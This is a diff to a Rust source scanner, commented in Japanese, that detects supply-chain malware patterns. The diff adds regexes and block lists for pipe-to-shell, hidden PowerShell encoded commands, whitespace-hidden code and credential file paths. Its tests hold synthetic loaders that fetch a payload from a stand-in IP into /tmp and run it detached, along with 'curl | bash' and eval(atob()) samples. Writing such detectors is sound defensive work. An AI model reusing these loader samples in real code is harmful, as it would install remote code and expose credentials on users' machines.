@@ -55,8 +55,16 @@ const DOC_PREFIXES: &[&str] = &[
     "SECURITY",
 ];
 
+/// ブラウザで読む静的な配布物（Next.js の `_next/static/` 等）。Node・Python からは実行されない。
+/// 画面のコード例（`curl …`）や環境変数の表示で誤検知するので見ない
+const BROWSER_BUNDLE_DIRS: &[&str] =
+    &["/_next/static/", "_next/static/", "/static/chunks/", "/static/js/", "/static/css/"];
+
 /// このファイルを調べるか
 pub fn is_scanned(path: &str) -> bool {
+    if BROWSER_BUNDLE_DIRS.iter().any(|d| path.starts_with(d.trim_start_matches('/')) || path.contains(d)) {
+        return false;
+    }
     let name = path.rsplit('/').next().unwrap_or(path);
     let up = name.to_ascii_uppercase();
     if DOC_NAMES.contains(&up.as_str()) || DOC_PREFIXES.iter().any(|p| up.starts_with(p)) {
@@ -78,6 +86,24 @@ fn re_blob() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| Regex::new(r"[A-Za-z0-9+/=_\-]{200,}").unwrap())
 }
+fn re_pipe_sh() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"(?:^|[^|])\|\s*(?:sudo\s+)?(?:sh|bash|zsh|python3?|node|iex)\b").unwrap())
+}
+fn re_ps_enc() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"\s-(?:e|ec|enc|encodedcommand)\s+[a-z0-9+/=]{20,}").unwrap())
+}
+fn re_ws_hide() -> &'static Regex {
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"\S[ \t]{150,}\S").unwrap())
+}
+fn re_hf_token() -> &'static Regex {
+    // `huggingface/tokenizers` を拾わない
+    static R: OnceLock<Regex> = OnceLock::new();
+    R.get_or_init(|| Regex::new(r"huggingface/token(?:[^a-z0-9_]|$)").unwrap())
+}
+
 fn re_host() -> &'static Regex {
     // URL の形でなく、ホスト名だけが文字列で書かれている場合（`host = "eth.llamarpc.com"` 等）
     static R: OnceLock<Regex> = OnceLock::new();
@@ -117,8 +143,15 @@ pub fn decode_b64_runs(line: &str) -> Vec<String> {
             [&base64::engine::general_purpose::STANDARD_NO_PAD, &base64::engine::general_purpose::URL_SAFE_NO_PAD]
         {
             if let Ok(b) = eng.decode(t) {
-                if let Ok(txt) = String::from_utf8(b) {
-                    if txt.chars().all(|c| !c.is_control() || c == '\n' || c == '\t') {
+                // PowerShell の -EncodedCommand は UTF-16LE
+                let txt = if b.len() >= 4 && b.len() % 2 == 0 && b.iter().skip(1).step_by(2).all(|x| *x == 0) {
+                    let u: Vec<u16> = b.chunks(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
+                    String::from_utf16(&u).ok()
+                } else {
+                    String::from_utf8(b).ok()
+                };
+                if let Some(txt) = txt {
+                    if txt.chars().all(|c| !c.is_control() || c == '\n' || c == '\t' || c == '\r') {
                         out.push(txt);
                         break;
                     }
@@ -169,7 +202,6 @@ const CRED_PATHS: &[&str] = &[
     ".docker/config.json",
     ".ssh/id_",
     ".kube/config",
-    "huggingface/token",
     ".config/gh/hosts.yml",
     ".pypirc",
     "gh auth token",
@@ -177,6 +209,7 @@ const CRED_PATHS: &[&str] = &[
 
 const OBF_CALLS: &[&str] = &[
     "eval(atob(",
+    "eval(function(",
     "eval(buffer.from(",
     "function(atob(",
     "eval(string.fromcharcode",
@@ -218,6 +251,23 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     let mut unref = false;
     let mut bin_fetch: Option<(usize, String)> = None;
     let mut chmod = false;
+    // 取って（または復号して）書いて動かす：同じファイルの増えた行にそろったら
+    let mut net_fetch: Option<(usize, String)> = None;
+    let mut spawn: Option<(usize, String)> = None;
+    let mut writes_tmp = false;
+    let mut decodes = false;
+    let mut writes_file = false;
+    // 別名で読み込んだモジュール（`import subprocess as _s` → `_s.Popen(`）でも拾えるよう、
+    // 「モジュールを読み込んだ」と「呼び出しの形」を分けて見る
+    let mut fetch_mod = false;
+    let mut fetch_call: Option<(usize, String)> = None;
+    let mut spawn_mod = false;
+    let mut spawn_call: Option<(usize, String)> = None;
+    // 読み込み・導入だけで動く場所：__init__.py（import 時）と setup.py（sdist の導入時）
+    let is_init = {
+        let name = path.rsplit('/').next().unwrap_or(path);
+        name == "__init__.py" || name == "setup.py"
+    };
 
     for (n, line) in lines {
         let l = line.to_ascii_lowercase();
@@ -230,6 +280,10 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
                     push(&mut out, "obfuscation", *n, &format!("長い符号化文字列（{} 文字）", m.as_str().len()));
                 }
             }
+        }
+        // 行の右端の外へ、大量の空白で押し出したコード（エディタの画面では見えない）
+        if is_code && re_ws_hide().is_match(line) {
+            push(&mut out, "obfuscation", *n, "大量の空白の後ろに隠したコード");
         }
         // javascript-obfuscator 等の変数名（_0x1a2b）が大量に並ぶ
         if line.matches("_0x").count() >= 20 {
@@ -267,7 +321,7 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         }
 
         // 認証ファイル
-        if CRED_PATHS.iter().any(|p| l.contains(p)) {
+        if CRED_PATHS.iter().any(|p| l.contains(p)) || re_hf_token().is_match(&l) {
             push(&mut out, "cred_paths", *n, line);
         }
 
@@ -314,6 +368,9 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
                     if in_list(&h, lists.chain_rpc) || has_suffix(&h, lists.chain_rpc_suffixes) {
                         push(&mut out, "chain_rpc", *n, &format!("（デコード後）{dec}"));
                     }
+                    if is_public_ipv4(&h) {
+                        push(&mut out, "raw_ip_url", *n, &format!("（デコード後）{dec}"));
+                    }
                 }
             }
         }
@@ -321,10 +378,8 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         // ダウンロードして実行
         // シェルでの取得 → そのまま実行（`curl … | sh`・`$(curl …)`）。復号して実行は obfuscation で拾う
         let fetch_cmd = ["curl ", "wget ", "invoke-webrequest", "iwr "].iter().any(|p| l.contains(p));
-        let pipe_sh =
-            ["| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python", "| node", "|node", "| iex", "|iex"]
-                .iter()
-                .any(|p| l.contains(p));
+        // `||` の後ろ（JS の `a||shouldX` 等）を拾わないよう、パイプ 1 本と語の区切りで見る
+        let pipe_sh = re_pipe_sh().is_match(&l);
         let subst = ["$(curl", "$(wget", "`curl", "`wget", "<(curl", "<(wget"].iter().any(|p| l.contains(p));
         if (fetch_cmd && pipe_sh) || subst {
             push(&mut out, "download_exec", *n, line);
@@ -336,6 +391,120 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
         }
         if l.contains("chmod") {
             chmod = true;
+        }
+
+        // コードの中からの取得・起動・書き込み（シェルを使わない形）
+        if [
+            "urllib.request.urlopen(",
+            "urllib.request.urlretrieve(",
+            "urlretrieve(",
+            "urlopen(",
+            "requests.get(",
+            "requests.post(",
+            "httpx.get(",
+            "http.client.",
+            "https.get(",
+            "http.get(",
+            "https.request(",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+        {
+            net_fetch.get_or_insert((*n, line.clone()));
+        }
+        if [
+            "subprocess.popen(",
+            "subprocess.run(",
+            "subprocess.call(",
+            "subprocess.check_output(",
+            "os.system(",
+            "os.popen(",
+            "os.execv",
+            "os.startfile(",
+            "execsync(",
+            "execfilesync(",
+            "child_process').exec",
+            "child_process\").exec",
+            "spawnsync(",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+            || (compact.contains("spawn(") && l.contains("child_process"))
+        {
+            spawn.get_or_insert((*n, line.clone()));
+        }
+        if l.contains("/tmp/")
+            || compact.contains("tempfile.")
+            || compact.contains("os.tmpdir()")
+            || l.contains("%temp%")
+        {
+            writes_tmp = true;
+        }
+        if compact.contains("b64decode(") || compact.contains("'base64')") || compact.contains("\"base64\")") {
+            decodes = true;
+        }
+        if compact.contains("open(")
+            && (compact.contains("'wb'") || compact.contains("\"wb\"") || compact.contains("'w'"))
+            || compact.contains("writefilesync(")
+            || compact.contains("urlretrieve(")
+        {
+            writes_file = true;
+        }
+        if [
+            "importurllib.request",
+            "urllib.requestas",
+            "fromurllib.requestimport",
+            "importrequests",
+            "importhttpx",
+            "require('https')",
+            "require(\"https\")",
+            "require('http')",
+            "require(\"http\")",
+        ]
+        .iter()
+        .any(|p| compact.contains(p))
+        {
+            fetch_mod = true;
+        }
+        if [".urlretrieve(", ".urlopen(", "urlopen(", "urlretrieve(", "requests.get(", ".get(", ".request("]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            fetch_call.get_or_insert((*n, line.clone()));
+        }
+        // 外部コマンドの curl・wget で取る（`subprocess.run(["curl", …, "-o", dest])` の形）
+        if ["\"curl\"", "'curl'", "\"wget\"", "'wget'"].iter().any(|p| l.contains(p)) {
+            net_fetch.get_or_insert((*n, line.clone()));
+        }
+        if ["importsubprocess", "subprocessas", "fromsubprocessimport", "child_process"]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            spawn_mod = true;
+        }
+        if [".popen(", ".run(", ".call(", ".check_output(", ".check_call(", "popen(", "execsync(", ".exec(", ".spawn("]
+            .iter()
+            .any(|p| compact.contains(p))
+        {
+            spawn_call.get_or_insert((*n, line.clone()));
+        }
+        if compact.contains("start_new_session=true") && (spawn.is_some() || spawn_mod) {
+            push(&mut out, "detach", *n, line);
+        }
+
+        // 隠した PowerShell（-EncodedCommand・-WindowStyle Hidden）
+        if l.contains("powershell") || l.contains("pwsh") {
+            if re_ps_enc().is_match(&l) || l.contains("-windowstyle hidden") || l.contains("-w hidden") {
+                push(&mut out, "obfuscation", *n, line);
+                spawn.get_or_insert((*n, line.clone()));
+            }
+            if l.contains("downloadstring(")
+                || l.contains("invoke-webrequest")
+                || l.contains("iwr ")
+                || l.contains("downloadfile(")
+            {
+                push(&mut out, "download_exec", *n, line);
+            }
         }
 
         // CI のシークレット
@@ -363,6 +532,29 @@ pub fn scan_lines(path: &str, lines: &[(usize, String)], lists: &Lists) -> Vec<F
     }
     if let (Some((n, l)), true) = (&bin_fetch, chmod) {
         push(&mut out, "download_exec", *n, l);
+    }
+    let is_py = matches!(ext.as_str(), "py" | "pyw" | "pth");
+    // 別名からの呼び出しで判定するのは Python だけ（JS の `.get(`・`.exec(` は普通の呼び出しに多すぎる）
+    if net_fetch.is_none() && fetch_mod && is_py {
+        net_fetch = fetch_call.clone();
+    }
+    if spawn.is_none() && spawn_mod && (is_py || spawn_call.as_ref().is_some_and(|(_, l)| l.contains("child_process")))
+    {
+        spawn = spawn_call.clone();
+    }
+    // 取って、置いて、動かす（2 段目の取得。2026 年の PyPI の乗っ取りで多い形）
+    if let (Some((n, l)), Some(_), true) = (&net_fetch, &spawn, writes_tmp || writes_file) {
+        push(&mut out, "download_exec", *n, l);
+    }
+    // 復号して、書いて、動かす（中身を base64 で隠した本体）
+    if let (Some((n, l)), true, true) = (&spawn, decodes, writes_file || writes_tmp) {
+        push(&mut out, "drop_exec", *n, l);
+    }
+    // パッケージの読み込み（import）だけで、取得や起動が走る
+    if is_init {
+        if let Some((n, l)) = spawn.as_ref().or(net_fetch.as_ref()) {
+            push(&mut out, "import_time_exec", *n, l);
+        }
     }
     out
 }
@@ -448,6 +640,78 @@ def _start():
         assert!(run("a.py", "for k in os.environ:\n    print(k)").is_empty());
         // CI の設定に secrets を渡すだけ
         assert!(run("x.yml", "env:\n  T: ${{ secrets.T }}").is_empty());
+    }
+
+    #[test]
+    fn python_stage2_loader() {
+        // 2026 年の PyPI の乗っ取り（__init__.py に足された 2 段目の取得）をまねた合成の文字列。宛先は文字列として書くだけ
+        let t = "import os, subprocess, urllib.request\n\
+                 if os.name == 'posix':\n\
+                 \x20   urllib.request.urlretrieve('https://203.0.113.9/x.pyz', '/tmp/x.pyz')\n\
+                 \x20   subprocess.Popen(['python3', '/tmp/x.pyz'], start_new_session=True)\n";
+        let f = run("pkg/__init__.py", t);
+        for want in ["detach", "download_exec", "import_time_exec", "raw_ip_url"] {
+            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
+        }
+        // 同じ形でも __init__.py でなければ import_time_exec は出ない
+        assert!(!run("pkg/tools.py", t).contains(&"import_time_exec".to_string()));
+        // 復号して書いて動かす
+        let d = "import base64, subprocess, tempfile\nb = 'eA=='\nopen(p, 'wb').write(base64.b64decode(b))\nsubprocess.run([sys.executable, p])\n";
+        assert!(run("pkg/server.py", d).contains(&"drop_exec".to_string()));
+        // 別名で読み込んでも拾う
+        let a = "import subprocess as _sub, urllib.request as _u, os as _os\n\
+                 _dest = '/tmp/t.pyz'\n\
+                 _u.urlretrieve(_url, _dest)\n\
+                 _sub.Popen(['python3', _dest])\n";
+        assert!(
+            run("m/client/__init__.py", a).contains(&"download_exec".to_string()),
+            "{:?}",
+            run("m/client/__init__.py", a)
+        );
+        // 外部コマンドの curl で取る
+        let c = "import subprocess as _s\n_s.run(['curl', '-s', u, '-o', '/tmp/a.pyz'])\n_s.Popen([sys.executable, '/tmp/a.pyz'])\n";
+        assert!(run("m/__init__.py", c).contains(&"download_exec".to_string()));
+        // 取得だけ・起動だけでは出ない
+        assert!(run("pkg/net.py", "import requests\nr = requests.get(url)\n").is_empty());
+        assert!(run("pkg/cli.py", "import subprocess\nsubprocess.run(['git', 'status'])\n").is_empty());
+    }
+
+    #[test]
+    fn powershell_encoded() {
+        // 合成：UTF-16LE で "Invoke-WebRequest -Uri \"https://203.0.113.9/a\"" を base64 にしたもの
+        let enc: String = {
+            let s = "Invoke-WebRequest -Uri \"https://203.0.113.9/a\"";
+            let b: Vec<u8> = s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+            base64::engine::general_purpose::STANDARD.encode(b)
+        };
+        let t = format!(
+            "import subprocess\nsubprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {enc}', shell=True)\n"
+        );
+        let f = run("setup.py", &t);
+        for want in ["hidden_url", "import_time_exec", "obfuscation", "raw_ip_url"] {
+            assert!(f.contains(&want.to_string()), "{want} が出ない: {f:?}");
+        }
+    }
+
+    #[test]
+    fn whitespace_hiding() {
+        let l = format!("var a = require('./x');{}eval(atob(p))", " ".repeat(200));
+        assert!(run("lib/index.js", &l).contains(&"obfuscation".to_string()));
+        assert!(run("lib/index.js", &format!("var a = 1;{}", " ".repeat(300))).is_empty());
+    }
+
+    #[test]
+    fn bundles_and_lookalikes() {
+        // ブラウザ向けの配布物は見ない
+        assert!(run("pkg/proxy/out/_next/static/chunks/a.js", "curl -s https://x | sh").is_empty());
+        // `||sh…` はシェルへのパイプではない
+        assert!(run("a.js", "if(a||shouldRun){curl_cmd='curl -X POST x'}").is_empty());
+        assert!(run("a.sh", "curl -fsSL https://x/i.sh | bash").contains(&"download_exec".to_string()));
+        // huggingface/tokenizers は認証ファイルではない
+        assert!(run("sbom.json", r#""url": "https://github.com/huggingface/tokenizers""#).is_empty());
+        assert!(run("a.py", "p = '~/.cache/huggingface/token'").contains(&"cred_paths".to_string()));
+        // JS の普通の .get( と .exec(（正規表現）だけでは取得・起動にしない
+        assert!(run("a.js", "const m = re.exec(s); http.get(u); fs.writeFileSync('/tmp/x', d)").is_empty());
     }
 
     #[test]
